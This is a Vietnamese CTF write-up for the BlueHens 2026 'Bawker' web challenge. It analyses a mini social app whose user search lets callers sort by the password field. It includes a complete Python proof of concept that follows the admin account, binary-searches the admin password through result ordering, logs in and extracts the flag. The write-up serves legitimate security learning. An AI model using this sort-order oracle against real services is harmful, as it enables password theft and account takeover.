---
title: "Bawker"
slug: "bluehens-2026-bawker"
platform: "BlueHens CTF 2026"
difficulty: "Medium"
vulnerabilities: ["Side Channel","Access Control"]
publishedAt: "2026-09-14"
summary: "Phân tích chức năng tìm kiếm, quan hệ follow và thứ tự kết quả trên ứng dụng Bawker."
draft: false
sortOrder: 6
---
`#web` `#logic_bug` `#side_channel`
## Overview
Route overview 
```text
/app
├── /auth
│   ├── /login
│   └── /register
├── /users
│   ├── /me
│   └── /{user_id}
│       └── /follow
├── /search
│   ├── /users
│   └── /bawks
└── /bawks
    ├── /create
    └── /{bawk_id}
```

Đây là một app mô phỏng một mạng xã hội mini với ba chức năng chính sau:

- **auth**: là nhóm chức năng xử lý đăng ký, đăng nhập, đăng xuất và lấy thông tin của người dùng hiện tại.
- **users**: là nhóm chức năng quản lý hồ sơ người dùng, cho phép sửa `username`, `display_name`, `bio`, thiết lập `is_private`, đồng thời hỗ trợ follow / unfollow và xem quan hệ giữa các tài khoản.
- **bawks / search**: là phần xử lý nội dung chính của ứng dụng, bao gồm tạo bài viết, chỉnh sửa hoặc xóa bài viết, like, rebawk, và tìm kiếm user hoặc bài đăng.
## Source code analysis
1. **app/db.py**
![image](https://hackmd.io/_uploads/ryc8SZ8TWx.png)
![image](https://hackmd.io/_uploads/B1Oid-IpWl.png)
![image](https://hackmd.io/_uploads/rkhDFb8TZl.png)
=> admin password là plaintext độ dài 32, chữ + số. Từ đây có thể suy ra mục tiêu của challenge nhiều khả năng là truy cập được vào tài khoản admin hoặc ít nhất là xem được bài viết private của admin chứa flag
2. **app/models/user.py**
![image](https://hackmd.io/_uploads/B1p6HGU6Wx.png)
model `User` có field `password: str` 
=> password nằm ngay trong model SQL
3.  **app/routers/auth.py**
![image](https://hackmd.io/_uploads/rJ-1178Tbl.png)
=> Đoạn này hơi dài nhưng chủ yếu chỉ là create_user thì lưu password raw và lúc login thì so sánh raw string với raw string thôi
4. **app/deps/auth/py**
 ![image](https://hackmd.io/_uploads/rkTEWmI6-x.png)
=> register/login xong server sẽ set cookie => các request như `/api/user/0/follow` hay `/search/user` đều chạy với identity đó
5. **app/privacy.py**
![image](https://hackmd.io/_uploads/H1j_V78a-g.png)
=> điều kiện để xem được người khác tức nếu follow thôi thì k đọc được đâu
6. **app/routers/bawks.py**
 ![image](https://hackmd.io/_uploads/S1chHQUaZe.png)
=> feed và thao tác trên bawk đều đi qua logic visibility chuẩn, tức muốn xem private bawk chỉ hiện nếu mutual follow hoặc chính mình author
=> Lúc đầu ta đưa ra 2 ý tường là vào làm admin hoặc đọc bawk nhưng giờ cách đọc bawk có vẻ không khả thi 
7. **app/routers/users.py**
![image](https://hackmd.io/_uploads/HydBnQIaZg.png)
![image](https://hackmd.io/_uploads/B10unQU6We.png)

=> route follow không chặn follow admin chỉ chặn follow chính mình tức khi có user_id = 0 tức là id hợp lệ của admin luôn tồn tại trong DB thì mình sẽ follow được 
8. **app/filters/user_filter.py**
![image](https://hackmd.io/_uploads/ryoEpQI6bl.png)
=> filter này áp dụng trên model `User` vì thế nếu không chặn thì có thể override `oder_by` bằng mọi field của `User` và password cũng vậy
9. **app/routers/pages.py**
![image](https://hackmd.io/_uploads/HJvneE8aWg.png)
=> Route này không dùng lại `visibile_user_condition` khiến cho việc viewer follow targer là hiển thị và lại cho filter và sort do người dùng kiểm soát biến nơi đây là nơi khai thác chính
## Exploiting Chain and Flag
Giờ mình chốt lại chain  của bài sau:
1. admin có id 0, private và password random 32 kí tự chứa flag
2. register các account probe
3. register xong có session gọi `/api/users/0/follow` để follow admin
4. gọi `/search/users?order_by=password` vì viết sai route này nên nó sẽ hiện admin 
5. Biến list user thành oracle so sánh chuỗi password
6. Cuối cùng login admin rồi lấy flag thôi

Thực hiện nào

![image](https://hackmd.io/_uploads/SyCH84UTWg.png)

Ta có thể thấy là hiện tại `/search/users` vẫn chưa có ai vì ta chưa follow ai cả giờ ta sẽ thử follow admin bằng cách tự gửi request `/api/users/0/follow`
![image](https://hackmd.io/_uploads/HJ_FLNIaZg.png)
![image](https://hackmd.io/_uploads/SJU98VUaWg.png)
Ta có thể thấy đúng như giả thuyết đã thấy Admin ở route này. Ta đi tiếp việc test oracle
![image](https://hackmd.io/_uploads/S1Lp_VLpWg.png)
đây là khi ta gửi `order_by=password` thì `admin` sẽ đứng sau `a11` ta đã tạo còn khi test bằng `order_by=-password`
![image](https://hackmd.io/_uploads/H12NYNU6-x.png)
thứ tự đã thay đổi
=> backend chấp nhận password là field hợp lệ để sort. Diều này biến sorting thành một side channel/oracle
Từ đây ta tìm password bằng đoạn PoC sau:
```python=
#!/usr/bin/env python3
import argparse
import random
import re
import string
import sys
import time
from typing import Optional

import requests
CHARSET = ''.join(sorted(string.ascii_letters + string.digits))
FLAG_RE = re.compile(r'UDCTF\{[^}]+\}')
USER_RE = re.compile(r'<p>@([^<]+)</p>')
DEFAULT_BASE_URL = 'http://localhost:1337'


def username(prefix: str = 'probe') -> str:
    return f"{prefix}{int(time.time() * 1000)}{random.randint(1000,9999)}"


class Exploit:
    def __init__(self, base_url: str = DEFAULT_BASE_URL, verbose: bool = True):
        self.base = base_url.rstrip('/')
        self.verbose = verbose

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    def register_probe(self, uname: str, password: str, private: bool = False) -> requests.Session:
        s = requests.Session()
        payload = {
            'username': uname,
            'password': password,
            'display_name': uname,
            'bio': 'x',
            'is_private': private,
        }
        r = s.post(f"{self.base}/api/auth/register", json=payload, timeout=20, allow_redirects=False)
        if r.status_code not in (200, 201):
            raise RuntimeError(f"register failed for {uname}: {r.status_code} {r.text[:300]}")
        return s

    def follow_admin(self, s: requests.Session) -> None:
        r = s.post(f"{self.base}/api/users/0/follow", timeout=20, allow_redirects=False)
        if r.status_code not in (200, 204):
            raise RuntimeError(f"follow admin failed: {r.status_code} {r.text[:300]}")

    def set_private(self, s: requests.Session, uname: str) -> None:
        payload = {
            'username': uname,
            'display_name': uname,
            'bio': 'x',
            'is_private': True,
        }
        try:
            s.patch(f"{self.base}/api/users/me", json=payload, timeout=20)
        except Exception:
            pass

    def get_order(self, s: requests.Session, probe_uname: str, size: int = 50, max_pages: int = 50):
        all_users = []
        for page in range(1, max_pages + 1):
            r = s.get(
                f"{self.base}/search/users",
                params={'order_by': 'password', 'size': size, 'page': page},
                timeout=20,
            )
            if r.status_code != 200:
                raise RuntimeError(f"search failed page {page}: {r.status_code} {r.text[:200]}")
            users = USER_RE.findall(r.text)
            if not users:
                break
            all_users.extend(users)
            if 'admin' in all_users and probe_uname in all_users:
                break
        if 'admin' not in all_users or probe_uname not in all_users:
            raise RuntimeError(f"could not locate admin/probe in listing; found={all_users[:20]}...")
        return all_users.index('admin'), all_users.index(probe_uname), all_users

    def probe_leq(self, prefix: str, ch: str, total_len: int = 32) -> bool:
        pad_len = total_len - len(prefix)
        guess = prefix + ch + ('~' * max(pad_len, 0))
        if len(guess) < 8:
            guess = guess.ljust(8, '~')

        uname = username('probe')
        s = self.register_probe(uname, guess, private=False)
        self.follow_admin(s)
        admin_idx, probe_idx, _ = self.get_order(s, uname)
        self.set_private(s, uname)

        leq = admin_idx < probe_idx
        self.log(
            f"    [?] probe='{guess[:20]}{'...' if len(guess) > 20 else ''}' => admin_idx={admin_idx}, probe_idx={probe_idx}, actual_char <= '{ch}' is {leq}"
        )
        return leq

    def recover_password(self, total_len: int = 32) -> str:
        prefix = ''
        for pos in range(total_len):
            lo, hi = 0, len(CHARSET) - 1
            self.log(f"[*] Recovering character {pos + 1}/{total_len}; prefix={prefix!r}")
            while lo < hi:
                mid = (lo + hi) // 2
                ch = CHARSET[mid]
                if self.probe_leq(prefix, ch, total_len=total_len):
                    hi = mid
                else:
                    lo = mid + 1
            prefix += CHARSET[lo]
            self.log(f"[+] Character {pos + 1}: {CHARSET[lo]!r} => {prefix}")
        return prefix

    def login_admin_and_fetch_flag(self, password: str) -> Optional[str]:
        s = requests.Session()
        r = s.post(
            f"{self.base}/api/auth/login",
            json={'username': 'admin', 'password': password},
            timeout=20,
        )
        if r.status_code != 200:
            raise RuntimeError(f"admin login failed: {r.status_code} {r.text[:300]}")
        page = s.get(f"{self.base}/", timeout=20)
        m = FLAG_RE.search(page.text)
        return m.group(0) if m else None


def main() -> int:
    ap = argparse.ArgumentParser(description='Exploit Bawker password-ordering oracle')
    ap.add_argument('base_url', nargs='?', default=DEFAULT_BASE_URL, help=f'target base URL (default: {DEFAULT_BASE_URL})')
    ap.add_argument('--length', type=int, default=32, help='admin password length')
    ap.add_argument('--quiet', action='store_true')
    args = ap.parse_args()

    exp = Exploit(args.base_url, verbose=not args.quiet)
    password = exp.recover_password(total_len=args.length)
    print(f"[+] Recovered admin password: {password}")
    flag = exp.login_admin_and_fetch_flag(password)
    if flag:
        print(f"[+] Flag: {flag}")
    else:
        print('[!] Logged in as admin, but flag regex was not found on /. Open the feed manually.')
    return 0


if __name__ == '__main__':
    sys.exit(main())

```
Ý tưởng chính của đoạn PoC trên là biến `/search/users?order_by=password` thành oracle so sánh chuỗi, rồi binary search leak 32 kí tự đặc biệt chú ý vòng cuối probe phải là `prefix + ch + thêm ~` để tránh trường hợp bằng đúng , 
![image](https://hackmd.io/_uploads/B1uTYNIp-e.png)
Ta thực hiện trên instance và có được flag
![image](https://hackmd.io/_uploads/rkkykSLaWl.png)
**UDCTF{Pl34s3_D0_n0t_4ll0w_0rd3r_by_P4Ssw0rd!!}**